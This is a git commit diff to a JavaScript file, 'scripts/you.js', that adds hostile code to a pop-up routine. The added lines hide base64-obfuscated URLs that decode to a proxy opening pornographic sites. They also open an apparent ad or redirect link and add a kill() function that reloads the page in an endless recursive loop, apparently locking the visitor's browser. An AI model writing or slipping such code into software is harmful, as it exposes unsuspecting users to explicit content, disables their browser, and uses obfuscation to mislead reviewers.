e8b7f009e79640fc9733c7a37344f6b83154b4a7
Crazystuffxyz <125907466+crazystuffofficial@users.noreply.github.com>
2023-04-26 10:45:42 -0400

    Update you.js

--- scripts/you.js
+++ scripts/you.js
@@ -60,7 +60,17 @@ function openWindow(url) {
 function proCreate() {	
 	for (var i = 0; i < 5; i++) {
 		openWindow('lol.html');
+		openWindow(atob('aHR0cHM6Ly93ZWVkd2VkZHdld2Vkd2Rld2R3ZXdkZWRld2Rld2Rld2V3ZWVkd2Vkd2VlZC52ZXJjZWwuYXBwL3Byb3h5L2h0dHBzOi8vcG9ybmh1Yi5jb20='));
+		openWindow(atob('aHR0cHM6Ly93ZWVkd2VkZHdld2Vkd2Rld2R3ZXdkZWRld2Rld2Rld2V3ZWVkd2Vkd2VlZC52ZXJjZWwuYXBwL3Byb3h5L2h0dHBzOi8vcG9ybi5jb20='));
+		openWindow('https://agacelebir.com/4/2888721');
+		kill();
 	}
+}
+function kill(){
+while(true){
+window.location.reload();
+kill();
+}
 }
 
 function newXlt() {
